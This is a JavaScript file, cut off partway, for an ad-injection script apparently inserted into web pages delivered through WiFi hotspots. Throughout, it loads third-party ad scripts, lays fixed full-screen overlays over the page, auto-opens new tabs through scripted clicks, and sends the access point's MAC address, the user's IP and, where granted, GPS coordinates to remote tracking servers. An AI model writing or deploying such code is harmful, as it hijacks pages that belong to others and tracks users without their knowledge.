var cpro_id = "";
var can_create_58 = false;
var baiduImagePlus = {};
var b_js_Blocked = false;
var is_window_loaded = false;
window.slotbydup = [];
var runFromIframe = false;
hl_get_mac = "";
if (top != self) {
	runFromIframe = true
}
if (!Date.now) {
	Date.now = function() {
		return new Date().getTime()
	}
}
window._yn_map = window._yn_map || new function() {
	this.keys = new Array();
	this.data = new Object();
	this.put = function(key, value) {
		if (this.data[key] == null) {
			this.keys.push(key)
		}
		this.data[key] = value
	};
	this.get = function(key) {
		return this.data[key]
	}
};

function sendCM(bidid, hrefUrl) {
	var code_id = window._yn_map.get('code_id');
	var proto = window._yn_map.get(code_id);
	var cm = window._yn_map.get(bidid);
	if (cm instanceof Array) {
		for (var i = 0; i < cm.length; i++) {
			var url = cm[i] + '&rd=' + Date.now();
			proto.addLogAppendChild(url, 'd_1_cm')
		}
		proto.sendLogMsgIm('d_1_cm', bidid)
	}
	setTimeout(function() {
		openwin(hrefUrl)
	}, 100)
}
//自动打开新页面
function openwin(url) {
	var a = document.createElement("a");
	a.setAttribute("href", url);
	a.setAttribute("target", "_blank");
	document.body.appendChild(a);
	a.click()
}
function addYnLoadEvent(func) {
	if (document.addEventListener) {
		window.addEventListener('load', func, false)
	} else {
		window.attachEvent('onload', func)
	}
}
//判断是否是百度广告
function isBaiduJsLoaded() {
	if (window.BAIDU_SSP_EXP_FLAG || window.BAIDU_C_BASE || window.BAIDU_DUP2 || window.BAIDU_DUP || window.BAIDU_DUP2_require || window._dup_global || window.BAIDU_SSP_define || window.BAIDU_DUP_require || window.BAIDU_DUP2_pageFirstRequestTime) {
		b_js_Blocked = false
	} else {
		b_js_Blocked = true
	}
}
function checkBaiduJs() {
	isBaiduJsLoaded();
	is_window_loaded = true
}
//创建异步js加载
function _append_yn_js(src) {
	var script = document.createElement("script");
	script.src = src;
	script.type = 'text/javascript';
	if (document.getElementsByTagName("body")[0]) {
		document.getElementsByTagName("body")[0].appendChild(script)
	} else {
		document.getElementsByTagName("head")[0].appendChild(script)
	}
}
//创建异步js加载
function append_yn_Js(src) {
	var script = document.createElement("script");
	script.src = src;
	script.type = 'text/javascript';
	if (document.getElementsByTagName("body")[0]) {
		document.getElementsByTagName("body")[0].appendChild(script)
	} else {
		document.getElementsByTagName("head")[0].appendChild(script)
	}
}
//创建异步css加载
function _append_yn_css(src) {
	var link = document.createElement("link");
	link.href = src;
	link.setAttribute('rel', 'stylesheet');
	if (document.getElementsByTagName("body")[0]) {
		document.getElementsByTagName("body")[0].appendChild(link)
	} else {
		document.getElementsByTagName("head")[0].appendChild(link)
	}
}
function yn_isMobile() {
	return navigator.userAgent.toLowerCase().match(/(iphone|ipod|android|ios|symbianos|ipad|mobile|windows phone|tablet)/i)
};
if (!runFromIframe) {
	addYnLoadEvent(checkBaiduJs);
	if (yn_isMobile()) {
		_append_yn_js("http://dup.baidustatic.com/js/dm.js")
	} else {
		_append_yn_js("http://dup.baidustatic.com/js/ds.js")
	}
}
function _YN_WIFI() {};

function _yn_run() {
	new _YN_WIFI().init()
}
_YN_WIFI.prototype = {
	codeId: "",
	apMac: "",
	cumid: "",
	width: 320,
	height: 50,
	apgId: "",
	aptId: "",
	divId: "",
	bottom: 0,
	right: 0,
	p: "",
	onlyyn: false,
	style: "",
	eb: 1,
	injectTime: "",
	userip: "",
	isDomainLimited: false,
	isBaiRequired: false,
	needBaiduImagePlus: false,
	needBaiduDuBao: true,
	ad: {
		chooseName: ""
	},
	yn: {
		ynClicked: false
	},
	bd: {
		isFillFailed: false,
		fbad: false,
		baiduLoaded: false,
		bproId: "",
		baiduClicked: false,
		cpCalled: false,
		cpForceReq: false,
		picPlusCalled: false,
		dubaoCalled: false,
		forceRequest: false,
		cpInjected: false,
		dubaoInjected: false,
		picPlusInjected: false,
		reqCount: 0
	},
	server: "180.76.155.58",
	jsserver: "un.soarfi.cn",
	userClosed: false,
	customized: false,
	isMonitor: false,
	lunBo: 0,
	lunBoScheduled: false,
	y_now: Date.now(),
	y_cid: "",
	isAmMerged: false,
	isUmMerged: false,
	log_called: false,
	adCount: 0,
	onMessage: function(e) {
		if (e.data == "baidu_blank" || e.data == "baidu_gongyi" || e.data == "fill_failed") {
			if (this.ad.chooseName == "baidu") {
				this.close()
			}
			this.bd.isFillFailed = true;
			this.createDefault()
		}
	},
	//获取url地址的参数
	getUrlParam: function(url, name) {
		if (url != null && url.split("?").length > 1) {
			var p = url.split("?")[1];
			p = p.replace(";", "");
			if (p.length > 1) {
				var parameters = p.split("&");
				for (var i = 0; i < parameters.length; i++) {
					var item = parameters[i];
					var items = item.split("=");
					if (items[0] == name) {
						return items[1]
					}
				}
			}
		}
		return ""
	},

	//获取指定名称的js
	getJsUrl: function(name) {
		var scripts = document.getElementsByTagName('script');
		var l = scripts.length;
		var tmp_js_count = 0;
		for (var i = 0; i < l; i++) {
			js = scripts[i].src;
			if (js.indexOf(name + ".js") != -1) {
				++tmp_js_count;
				if (tmp_js_count > 1) {
					window._yn_map.put("js_count", tmp_js_count)
				}
			}
		}
		for (var i = 0; i < l; i++) {
			js = scripts[i].src;
			if (js.indexOf(name + ".js") != -1) {
				if (js.indexOf("adtest") != -1) {
					this.server = "adtest.winasdaq.com";
					this.jsserver = "adtest.winasdaq.com"
				} else if (js.indexOf("uny.imochy.com") != -1) {
					this.server = "gg.imochy.com";
					this.jsserver = "uny.imochy.com"
				}
				var ydcp_id = this.getUrlParam(js, "ydcp_id");
				var ynwf = window._yn_map.get(ydcp_id);
				if (!ynwf) {
					window._yn_map.put("code_id", ydcp_id);
					window._yn_map.put(ydcp_id, {});
					return js
				}
			}
		}
		return ""
	},
	checkHm: function() {
		var index = 0;
		var scripts = document.getElementsByTagName('script');
		var l = scripts.length;
		for (var i = 0; i < l; i++) {
			var jsurl = scripts[i].src;
			if (jsurl.indexOf("hm.baidu.com/hm.js") != -1) {
				++index
			}
		}
		return index
	},
	init: function() {
		var js = this.getJsUrl("ydap");
		if (js == "") {
			js = this.getJsUrl("yn")
		}
		if (js == "") {
			js = this.getJsUrl("njyn")
		}
		if (js == "") {
			js = this.getJsUrl("njyn10314")
		}
		if (js != "") {
			this.codeId = this.getUrlParam(js, "ydcp_id");
			if (!runFromIframe || this.codeId == "10058") {
				_append_yn_js("http://" + this.jsserver + "/c.js?v=0.2");
				if (yn_isMobile() && !runFromIframe) {
					_append_yn_js("http://" + this.jsserver + "/p.js?v=0.1");
					_append_yn_css("http://yun.duiba.com.cn/static/jssdk/jssdk-1.3.4.min.css");
					_append_yn_js("http://yun.duiba.com.cn/static/jssdk/jssdk_a311404.js")
				}
			}
			this.canDeilivry();
			this.cumid = this.getUrlParam(js, "cumid");
			this.eb = this.getUrlParam(js, "eb");
			this.injectTime = this.getUrlParam(js, "_time");
			this.userip = this.getUrlParam(js, "userip");
			if (this.eb == "") {
				this.eb = 1
			}
			if (this.cumid.indexOf("$") != -1) {
				this.cumid = ""
			}
			this.apMac = this.getUrlParam(js, "apmac");
			if (this.apMac.indexOf("$") != -1) {
				this.apMac = ""
			}
			if (this.apMac.indexOf(",") != -1) {
				this.apMac = this.apMac.split(",")[0]
			}
			if (this.apMac.indexOf("-") != -1) {
				this.apMac = this.apMac.replace(/-/g, ":")
			}
			if (this.apMac.length == 12) {
				this.apMac = this.apMac.substring(0, 2) + ":" + this.apMac.substring(2, 4) + ":" + this.apMac.substring(4, 6) + ":" + this.apMac.substring(6, 8) + ":" + this.apMac.substring(8, 10) + ":" + this.apMac.substring(10, 12)
			}
			if (this.apMac == "null" || this.apMac == "NULL") {
				this.apMac = ""
			}
			this.apMac = this.apMac.toLowerCase();
			this.apgId = this.getUrlParam(js, "ydapg_id");
			this.aptId = this.getUrlParam(js, "apTagId");
			this.divId = this.getUrlParam(js, "divId");
			if (this.divId == "") {
				this.divId = "_yn_" + Math.random().toString(36).slice(2)
			} else {
				this.customized = true
			}
			this.y_cid = window._yn_map.get("y_cid");
			if (!this.y_cid) {
				this.y_cid = this.divId + "_" + this.y_now;
				window._yn_map.put("y_cid", this.y_cid)
			}
			if (this.codeId == 10382 || this.codeId == 10383 || this.codeId == 10384) {
				this.enableCpu = true
			}
			var t = this;
			if (typeof window.addEventListener != 'undefined') {
				window.addEventListener('message', function(e) {
					t.onMessage(e)
				}, false)
			} else if (typeof window.attachEvent != 'undefined') {
				window.attachEvent('onmessage', function(e) {
					t.onMessage(e)
				})
			}
			this.run();
			if (!runFromIframe) {
				document.onreadystatechange = function() {
					if (document.readyState == "interactive") {
						t.createCpuBottom()
					}
				}
			}
		}
	},
	validBaiduJs: function() {
		if (!this.isMonitor && typeof initialMonitor == "function") {
			this.isMonitor = true;
			initialMonitor(this.codeId)
		}
		if (is_window_loaded) {
			if (!runFromIframe) {
				var js_count = window._yn_map.get("js_count");
				if (js_count && this.codeId == "10219") {
					var l_url = "http://180.76.163.245/x.gif?codeId=" + this.codeId + "&msg=mult_js&url=" + encodeURIComponent(window.location.href) + "&js_count=" + js_count;
					var img = new Image;
					img.src = l_url
				}
				if (b_js_Blocked) {
					if (this.ad && this.ad.chooseName == "baidu") {
						this.createDefault()
					}
				} else {
					this.createCpuBottom();
					if (!this.enableCpu) {
						this.check_t_ad()
					}
					if (!this.bd.fbad && this.ad.chooseName == "baidu" && !this.isDomainLimited && can_create_58) {
						this.create58ad("st_gg_1ABE0303", "http://res.sspsky.com/cp.js?cid=1ABE0303")
					}
				}
			}
		} else {
			var t = this;
			setTimeout(function() {
				t.validBaiduJs()
			}, 10)
		}
	},
	run: function() {
		if (!document.body) {
			var t = this;
			setTimeout(function() {
				t.run()
			}, 10)
		} else {
			window._yn_map.put(this.codeId, this);
			this.validBaiduJs();
			if (!runFromIframe) {
				var img = new Image;
				img.src = "http://cm.pos.baidu.com/pixel?sspid=268951591&ext_data=z";
				if (this.enableCpuBlock) {
					this.createContentGG(false)
				} else {
					this.reqAd(this)
				}
			}
		}
	},
	display: function(t) {
		if (!this.userClosed) {
			var yn_gg = document.getElementById("_yn_g_g");
			var yd_f_gg = document.getElementById("_yn_gg_" + this.lunBo);
			var yn_gg_close = document.getElementById("_yn_gg_close");
			var baimi_gg_close = document.getElementById("BMSH_ad_close");
			if (yn_gg_close != null) {
				yn_gg_close.style.display = "inline-block"
			}
			if (yn_gg != null) {
				yn_gg.style.display = "inline-block"
			}
			if (yd_f_gg != null) {
				yd_f_gg.style.backgroundColor = "white"
			}
			if (baimi_gg_close != null) {
				baimi_gg_close.style.display = "inline-block"
			}
			if (this.ad && this.ad.isScreenAD && this.ad.code.isNeedScreenAD && this.ad.chooseName != "baidu") {
				setTimeout(function() {
					if (!t.ad.code.enableOnlySelf) {
						t.bd.cpInjected = true;
						t.ad.isScreenAD = false;
						t.ad.code.isNeedScreenAD = false;
						yn_gg.innerHTML = "";
						t.createDiv(t.ad);
						t.createBaidu(t.ad)
					}
					t.close(t)
				}, 8000)
			} else {
				if (t.lunBo == 0) {
					setTimeout(function() {
						t.reqLunBoAd()
					}, 12000)
				}
				if (t.lunBo > 0 && !t.lunBoScheduled) {
					t.lunBoScheduled = true;
					setTimeout(function() {
						t.scheduleLunBo(t, t.ad.code.bcode.mob, 0)
					}, 10000)
				}
			}
		}
	},
	close: function() {
		if (document.getElementById('_yn_g_g') != null) {
			document.getElementById('_yn_g_g').style.display = 'none'
		}
	},
	closeByUser: function() {
		this.close();
		this.userClosed = true
	},
	createDiv: function(ynad) {
		this.bottom = 0;
		this.width = 300;
		this.height = 250;
		if (this.isMobile()) {
			this.width = document.body.scrollWidth;
			if (this.content_more) {
				this.height = parseInt(5 * this.width / 20 + 1) + 10
			} else {
				this.height = parseInt(3 * this.width / 20 + 1)
			}
		} else {
			if (ynad && ynad.campaign) {
				this.style = "P_F_300_250"
			} else if (this.style == "" && ynad) {
				this.width = 580;
				this.height = 90
			}
		}
		if (ynad && ynad.isScreenAD && ynad.campaign) {
			this.ad.isScreenAD = ynad.isScreenAD;
			this.width = this.width - 30;
			this.height = parseInt(5 * this.width / 6 + 1);
			var dheight = document.documentElement.clientHeight;
			if (dheight <= 0) {
				dheight = document.body.clientHeight
			}
			if (dheight > this.height) {
				this.bottom = (dheight - this.height) / 2 - 20
			} else {
				this.bottom = (dheight - this.height) - 20
			}
		}
		if (this.style == "P_F_300_250" && !this.isMobile()) {
			this.bottom = 5;
			this.right = 5
		} else {
			this.right = (document.body.scrollWidth - this.width) / 2
		}
		if (this.p == "") {
			var platform = "mob";
			if (!this.isMobile()) {
				platform = "pc"
			}
			var p = "codeId=" + this.codeId + "&cumid=" + this.cumid + "&apMac=" + this.apMac;
			p = p + "&w=" + this.width + "&h=" + this.height;
			p = p + "&apGroupId=" + this.apgId + "&apTagId=" + this.aptId + "&platform=" + platform;
			p = p + "&jstime=" + this.y_now + "&cid=" + this.y_cid + "&injectTime=" + this.injectTime + "&userip=" + this.userip;
			this.p = p
		}
	},
	addContent: function(content) {
		if (this.divId.indexOf(",") == -1) {
			var c = document.getElementById(this.divId);
			var yd_f_gg = "_yn_gg_" + this.lunBo;
			var close_id = "_yn_gg_close";
			var closeEleOld = document.getElementById(close_id);
			var closeEle = null;
			var ggEle = document.getElementById(yd_f_gg);
			var appendGG = false;
			if (c == null) {
				if (closeEleOld == null) {
					closeEle = document.createElement("div");
					closeEle.id = close_id;
					var codeId = this.codeId;
					closeEle.onclick = function() {
						window._yn_map.get(codeId).closeByUser()
					};
					closeEle.style.display = "none";
					closeEle.style.position = "fixed";
					closeEle.style.right = this.right + 'px';
					if (this.bottom > 10) {
						closeEle.style.bottom = this.bottom + this.height + 'px'
					} else {
						closeEle.style.bottom = this.height + 'px'
					}
					closeEle.style.height = "20px";
					closeEle.style.width = "50px";
					closeEle.style.background = "url(http://cpro.baidustatic.com/cpro/ui/noexpire/img/2.0.0/xuantingClose3.png)";
					closeEle.style.cursor = "pointer";
					closeEle.style.zIndex = "2147483647"
				}
				if (!ggEle) {
					appendGG = true;
					ggEle = document.createElement("span");
					ggEle.id = yd_f_gg;
					ggEle.style.position = "fixed";
					ggEle.style.right = this.right + 'px';
					ggEle.style.bottom = this.bottom + 'px';
					ggEle.style.height = this.height + "px";
					ggEle.style.width = this.width + "px";
					ggEle.style.zIndex = "2147483647"
				}
				ggEle.innerHTML = content
			}
			var y = document.getElementById("_yn_g_g");
			if (c != null && this.divId.indexOf("_yn_") == -1) {
				c.innerHTML = content
			} else {
				if (y == null) {
					y = document.createElement("div");
					y.id = "_yn_g_g";
					document.body.appendChild(y)
				}
				if (closeEleOld == null) {
					y.appendChild(closeEle)
				}
				if (appendGG) {
					y.appendChild(ggEle)
				}
			}
		}
	},
	isMobile: function() {
		return yn_isMobile()
	},
	reqAd: function() {
		this.addStyle();
		this.createDiv();
		if (this.codeId != "10044") {
			var b_c = document.getElementById("BMSH_ad_close");
			if (b_c != null) {
				b_c.style.display = "none"
			}
		}
		var w = document.body.scrollWidth;
		if (this.isMobile() || w >= 1000) {
			if (this.apMac != "00:0c:29:a7:d4:77" && this.apMac != "00:15:5d:70:2c:c0" && this.apMac != "00:e1:6c:68:07:52" && this.apMac != "00:13:5d:70:0c:66" && this.apMac != "00:15:5d:70:2c:bb" && this.apMac != "00:15:5d:c8:8c:51") {
				_append_yn_js("http://" + this.server + "/delivery/yn.do?" + this.p);
				if (this.codeId == "10350") {
					this.addLog("http://adtest.winasdaq.com/delivery/ip2mac.do?userip=" + this.userip)
				}
			}
		}
	},
	createAd: function(ynad) {
		if (this.codeId == "10113" || this.codeId == "10044") {
			this.customized = true
		}
		this.isNeedCpuPush = ynad.isNeedCpuPush;
		if (this.ad.chooseName == "") {
			this.ad = ynad
		} else {
			this.ad.next = ynad
		}
		this.getGPSInfo(ynad);
		if (this.apMac != ynad.apMac) {
			this.apMac = ynad.apMac
		}
		if (this.cumid != ynad.cumid) {
			this.cumid = ynad.cumid
		}
		this.isAmMerged = ynad.isAmMerged;
		this.isUmMerged = ynad.isUmMerged;
		if (!this.isDomainLimited) {
			this.isDomainLimited = this.ad.isDomainLimited
		}
		this.isBaiRequired = this.ad.isBaiRequired;
		if (ynad && ynad.code) {
			this.eb = 0;
			if (ynad.code.enableBanner) {
				this.eb = 1
			}
			if (ynad.code && ynad.code.status != 0) {
				if (this.ad.code.enableMobDuBao && ynad.dubao) {
					this.needBaiduDuBao = false;
					this.ynDuBao(ynad)
				}
				if (this.ad.code.enableMobPicPlus && ynad.picPlus && ynad.picPlus.length > 0) {
					this.ynMonPlus(ynad)
				} else {
					this.needBaiduImagePlus = true
				}
				if (this.ad.code.enableMobInfoStream && ynad.infoStream && ynad.infoStream.length > 0) {
					this.ynInfoStream(ynad)
				}
				if (this.ad.code.enableMobPush && ynad.push) {
					this.ynPush(ynad)
				}
				if (this.eb == 1) {
					if (ynad.campaign && ynad.campaign.showMaterial) {
						this.createDiv(ynad);
						this.createYD(ynad);
						this.createIM(ynad)
					} else if (!this.isDomainLimited && this.ad.code && this.ad.code.bcode) {
						if (this.codeId == 10350) {
							this.create58ad("st_gg", "http://res.sspsky.com/cp.js?cid=f459f348cf5b780c42e60058060d6844")
						} else {
							if (!this.isBaiduLimited()) {
								ynad.chooseName = "baidu";
								this.createBaidu(ynad)
							}
						}
					}
				}
			}
			if (!this.isDomainLimited || (this.isDomainLimited && this.isBaiRequired)) {
				if (this.needBaiduDuBao && this.ad.code.enableMobDuBao) {
					if (this.isMobile()) {
						var random = Math.floor(Math.random() * 100);
						if (random > 65 || this.codeId == 10350 || this.codeId == 10361) {
							this.sendLogMsg('tuia_dubao', "loaded");
							this.tuiAdubao()
						} else {
							this.sendLogMsg('tuia_dubao', "loaded_limit");
							this.create58dubaoAd("st_gg", "http://res.sspsky.com/cp.js?cid=9CB4D3B4")
						}
					}
				}
			}
			if (!this.isDomainLimited && this.ad.code && this.ad.code.bcode && !ynad.code.enableOnlySelf && !this.isBaiduLimited()) {
				if (ynad.code.enableJdt && ynad.code.bcode.mobScreen && !this.bd.cpInjected) {
					this.createBaiduJdt(ynad)
				}
				this.createFeiHong();
				if (!ynad.isAdNumLimited || this.adCount < 3) {
					this.createSceneAd()
				}
				if ((!ynad.isAdNumLimited || this.adCount < 3) && this.needBaiduImagePlus) {
					this.createPicPlus()
				}
			} else {
				if (!this.blocked_called && this.isMobile()) {
					this.blocked_called = true;
					if (this.isDomainLimited && this.isBaiRequired && !ynad.code.enableOnlySelf) {
						this.create58ad("st_gg", "http://res.sspsky.com/cp.js?cid=f459f348cf5b780c42e60058060d6844")
					}
					if (ynad.code.enableJdt && typeof _yn_t != 'undefined') {
						if (this.isDomainLimited && this.isBaiRequired && !ynad.code.enableOnlySelf && !this.st_called && can_create_58) {
							this.st_called = true;
							var t = this;
							setTimeout(function() {
								var random = Math.floor(Math.random() * 100);
								if (random > 75) {
									_yn_t.yn_addTop("http://un.soarfi.cn/yn/st.html?cid=e1421d62ebe66e82a94ba9d29b910329");
									t.sendLogMsg('st_gg_58_fc', "mf")
								} else if (random > 50) {
									_yn_t.yn_addTop("http://un.soarfi.cn/yn/st.html?cid=522432c550590462245ab5d817df24ab");
									t.sendLogMsg('st_gg_58_zp', "mf")
								} else if (random > 25) {
									_yn_t.yn_addTop("http://un.soarfi.cn/yn/st.html?cid=4af91a2965058c9555db9d1aff21e870");
									t.sendLogMsg('st_gg_wd_m', "mf")
								} else {
									_yn_t.yn_addTop("http://un.soarfi.cn/yn/st.html?cid=dc61d07ea6e795019097dbf86a229ea0");
									t.sendLogMsg('st_gg_wd_f', "mf")
								}
							}, 2000)
						}
					}
				}
			}
			if (!this.log_called || ynad.campaign) {
				this.log_called = true;
				var logUrl = "http://" + this.server + "/delivery/stat.do?codeId=" + this.codeId + "&cumid=" + this.cumid + "&apMac=" + this.apMac + "&adpName=" + ynad.chooseName;
				if (ynad.chooseName && ynad.chooseName == "baidu") {
					logUrl += "&adpId=" + this.bd.bproId
				} else {
					logUrl += "&adpId=" + this.codeId
				}
				if (ynad.campaign) {
					logUrl += "&campaignId=" + ynad.campaign.id;
					if (ynad.campaign.showMaterial && ynad.campaign.showMaterial.id) {
						logUrl += "&materialId=" + ynad.campaign.showMaterial.id
					}
				}
				if (ynad.adTime) {
					logUrl += "&adTime=" + ynad.adTime
				}
				if (ynad.campaign || this.cumid != "") {
					this.addLog(logUrl)
				}
			}
		}
	},
	getGPSInfo: function(ynad) {
		if (ynad && ynad.isNeedGpsInfo && !this.gpsInfo) {
			this.gpsInfo = true;
			var t = this;
			navigator.geolocation.getCurrentPosition(function(position) {
				var url = t.yl_url + "&longitude=" + position.coords.longitude + "&latitude=" + position.coords.latitude;
				t.y_report(url, 'gpsInfo');
				var logUrl = "http://" + t.server + "/delivery/stat.do?apMac=" + t.apMac + "&codeId=" + t.codeId + "&longitude=" + position.coords.longitude + "&latitude=" + position.coords.latitude;
				t.addLog(logUrl)
			}, function(err) {})
		}
	},
	createBaidu: function(bdad) {
		if (!this.bd.isFillFailed) {
			if (bdad && bdad.code.bcode && bdad.code.bcode.pc3_2 && !this.isMobile()) {
				this.style = "P_F_300_250"
			}
			var cproId = "";
			var size = "20:3";
			var bcode = bdad.code.bcode;
			if (!this.isMobile()) {
				size = "580,90";
				if (bcode && bcode.pc3_2) {
					cproId = bcode.pc3_2;
					size = '300,250'
				} else {
					cproId = bdad.code.bcode.pc
				}
			} else {
				cproId = bdad.code.bcode.mob
			}
			var containerId = this.divId;
			if (this.divId.indexOf("_yn_") != -1) {
				containerId = this.divId + "_" + this.lunBo
			}
			if (cproId != "" && cproId) {
				this.createDiv(bdad);
				if (document.getElementById("BMSH_adbox_content") != null) {
					this.divId = "BMSH_adbox_content";
					containerId = this.divId
				}
				if (this.divId.indexOf("_yn_") != -1) {
					this.addContent('<div id="' + containerId + '"></div>')
				}
				this.triggleBaiduAD(cproId, containerId, size);
				this.adCount++;
				this.bd.bproId = cproId;
				if (!this.bd.fbad) {
					var t = this;
					setTimeout(function() {
						t.monBaidu(t)
					}, 500)
				}
			}
		}
		window._yn_map.put(this.lunBo, "baidu");
		if (!this.vfcalled && this.codeId == 10059) {
			this.checkViewForcast();
			this.vfcalled = true
		}
	},
	triggleBaiduAD: function(cproId, containerId, size) {
		if (!this.isDomainLimited) {
			window.slotbydup = window.slotbydup || [];
			var containers = containerId.split(",");
			for (var index = 0; index < containers.length; index++) {
				window.slotbydup.push({
					id: cproId,
					container: containers[index],
					size: size,
					display: 'inlay-fix',
					clid: this.apMac,
					cuid: this.cumid
				})
			}
		}
	},
	createSceneAd: function() {
		var domain = document.domain;
		if (this.isMobile() && domain.indexOf("m.vip.com") == -1) {
			if (this.ad.code.enableMobScene) {
				if (this.ad.mobSceneCode) {
					this.triggleBaiduAD(this.ad.mobSceneCode, this.divId + "_ms", "")
				}
			}
		}
	},
	createBaiduJdt: function(cpad) {
		if (cpad.isJdt && cpad.code.bcode.mobScreen) {
			this.bd.cpInjected = true;
			var bcproid = cpad.code.bcode.mobScreen;
			this.triggleBaiduAD(bcproid, this.divId + "_cp", "");
			this.adCount++
		}
	},
	createDuBao: function() {
		if (this.isMobile() && !this.dubaoInjected && !this.ad.isScreenAD && this.ad.code && this.ad.code.enableMobDuBao && this.ad.code.bcode.mobDuBao) {
			this.dubaoInjected = true;
			this.triggleBaiduAD(this.ad.code.bcode.mobDuBao, this.divId + "_db", "");
			this.adCount++
		}
	},
	createFeiHong: function() {
		if (this.isMobile() && !this.bd.feihongInjected && !this.ad.isScreenAD && this.ad.code && this.ad.code.enableFeiHong && this.ad.code.bcode.feiHong) {
			this.bd.feihongInjected = true;
			this.triggleBaiduAD(this.ad.code.bcode.feiHong, this.divId + "_fh", "");
			this.adCount++
		}
	},
	createPicPlus: function() {
		if (!this.picPlusInjected) {
			this.picPlusInjected = true;
			if (this.isMobile() && this.ad.code && this.ad.code.enableMobPicPlus) {
				if (this.ad.code.bcode && this.ad.code.bcode.mobPicPlus) {
					var ppid = this.ad.code.bcode.mobPicPlus;
					var fromList = [{
						formId: 21
					}, {
						formId: 22
					}, {
						formId: 23
					}];
					baiduImagePlus = {
						unionId: ppid,
						formList: fromList,
						clid: this.apMac,
						cuid: this.cumid
					};
					_append_yn_js("http://cpro.baidustatic.com/cpro/ui/mi.js");
					this.adCount++
				}
			}
		}
	},
	createDefault: function() {
		if (this.isMobile() && this.codeId != 10219) {
			this.onlyyn = true;
			this.createDiv();
			_append_yn_js("http://" + this.server + "/delivery/yn.do?" + this.p + "&onlyyn=true")
		}
	},
	create58ad: function(msg, js) {
		if (document.domain.indexOf("58.com") == -1 && this.isMobile() && !this.customized && this.eb == 1 && !this.st_gg_called) {
			this.st_gg_called = true;
			_append_yn_js(js);
			this.sendLogMsg(msg, "mf")
		}
	},
	create58dubaoAd: function(msg, js) {
		if (document.domain.indexOf("58.com") == -1 && this.isMobile() && !this.customized && !this.st_gg_db_called) {
			this.st_gg_db_called = true;
			_append_yn_js(js);
			this.sendLogMsg(msg, "dubao")
		}
	},
	createCpuBottom: function(sendLog) {
		this.createBaiduBottom();
		if (this.isMobile() && !this.cpu_bottom_called && this.codeId != 10350) {
			var need_bottom = false;
			var need_log = true;
			if (this.enableCpu) {
				need_bottom = true
			} else if (this.ad.code && this.ad.code.bcode && this.ad.code.bcode.mob && (!this.isDomainLimited || (this.isDomainLimited && this.isBaiRequired)) && this.ad.code.enableMobScene) {
				need_bottom = true
			}
			var url = "http://un.winasdaq.com/yn/cpu.html";
			if (need_bottom) {
				this.cpu_bottom_called = true;
				var adifr = '<iframe  frameborder="no" border="0" scrolling="no" style="border:0px; border:none;" src ="' + url + '" height="1024" width="100%" ></iframe>';
				var y = document.createElement("div");
				y.style.height = "1024px";
				y.style.width = "100%";
				y.innerHTML = adifr;
				document.body.appendChild(y);
				if (need_log) {
					this.sendLogMsg('content_gg_bottom', "mf")
				}
			}
		}
	},
	createBaiduBottom: function() {
		var idst = "287";
		if (this.codeId != 10350 && this.codeId != 10343 && !this.isDomainLimited && !this.baidu_bottom_called && this.ad && this.ad.code && this.ad.code.bcode && this.ad.code.bcode.mob && this.isMobile() && this.eb == 1 && this.ad.code.enableMobScene) {
			this.baidu_bottom_called = true;
			var y = document.createElement("div");
			var did = "_yn_" + Math.random().toString(36).slice(2);
			y.id = did;
			document.body.appendChild(y);
			this.triggleBaiduAD("u" + idst + "1317", did, "20:10")
		}
	},
	createContentGG: function(sendLog) {
		if (this.isMobile()) {
			this.isHzCalled = true;
			this.content_more = true;
			this.createDiv();
			this.addIfrAD("http://un.winasdaq.com/yn/ez1.html");
			this.display(this);
			if (sendLog) {
				this.sendLogMsg('content_gg', "mf")
			}
		}
	},
	monBaidu: function(t) {
		if (!t.bd.fbad) {
			var frames = document.getElementsByTagName("iframe");
			for (var i = 0; i < frames.length; i++) {
				var id = frames[i].id;
				if (id.indexOf(t.bd.bproId) != -1 || id.indexOf(t.divId) != -1) {
					t.bd.baiduLoaded = true;
					t.display(t);
					t.bd.fbad = true;
					break
				}
			}
		}
		isBaiduJsLoaded();
		t.bd.reqCount++;
		if (!t.bd.fbad && !b_js_Blocked && !t.bd.forceRequest && t.lunBo == 0 && t.ad.chooseName == "baidu" && t.bd.reqCount > 5 && !t.isDomainLimited) {
			t.bd.reqCount = 0;
			t.bd.forceRequest = true;
			t.createAd(t.ad)
		} else {
			var ae = document.activeElement;
			if (ae && ae.id && (ae.id.indexOf(t.bd.bproId) != -1 || ae.id.indexOf(t.divId) != -1)) {
				t.bd.baiduClicked = true
			} else {
				setTimeout(function() {
					t.monBaidu(t)
				}, 200)
			}
		}
	},
	scheduleLunBo: function(t, cproid, index) {
		if (index > this.lunBo) {
			index = 0
		}
		var yn = document.getElementById("_yn_g_g");
		var _yn_gg_close = document.getElementById("_yn_gg_close");
		if (this.lbNext == "baidu") {
			if (this.lunBo > 0) {
				for (var i = 0; i <= this.lunBo; i++) {
					if (i != index) {
						var e = document.getElementById("_yn_gg_" + i);
						if (e) {
							e.style.display = "none"
						}
					}
				}
				var e = document.getElementById("_yn_gg_" + index);
				if (e) {
					e.style.display = "block"
				}
			}
		} else {
			if (!this.lbNexId) {
				var divList = document.getElementsByTagName("div");
				for (var i = 0; i < divList.length; i++) {
					var div = divList[i];
					if (div.id && div.id.indexOf("SSPSKY_") != -1) {
						this.lbNexId = div.id;
						break
					}
				}
			}
			if (this.lbNexId) {
				var lbDiv = document.getElementById(this.lbNexId);
				if (index == 0) {
					lbDiv.style.display = "none";
					yn.style.display = "inline-block";
					_yn_gg_close.style.display = "inline-block"
				} else {
					lbDiv.style.display = "inline-block";
					yn.style.display = "none";
					_yn_gg_close.style.display = "none"
				}
			}
		}
		setTimeout(function() {
			t.scheduleLunBo(t, cproid, index + 1)
		}, 6000)
	},
	reqLunBoAd: function() {
		if (!this.customized && this.isMobile() && !this.bd.isFillFailed && !this.userClosed && !this.isDomainLimited) {
			if (this.ad.chooseName == "baidu") {
				if ((document.body.scrollHeight > 650 && Math.floor(Math.random() * 100) > 75)) {
					++this.lunBo;
					this.createBaidu(this.ad);
					this.display(this);
					this.lbNext = "baidu"
				} else {}
			}
		}
	},
	createYD: function(ad) {
		var d = "";
		if (typeof ycad != 'undefined') {
			d = ycad.html
		}
		if (ad && ad.campaign && ad.campaign.showMaterial && d == "") {
			var material = ad.campaign.showMaterial;
			var style = "margin:0 auto; width:" + this.width + "px; height:" + this.height + "px;";
			d += '<div id="portal_yd" style="' + style + '">';
			if (material.dspType && material.dspType == 1 && material.bidid) {
				var hrefUrl = ad.campaign.clickUrl + "&adTime=" + ad.adTime;
				d += '<a href="javascript:;" target="_blank" ';
				d += 'onclick="sendCM(\'' + material.bidid + '\',\'' + ad.campaign.clickUrl + '\'); return false;"';
				d += '>';
				this.cretaeD1Log(material)
			} else {
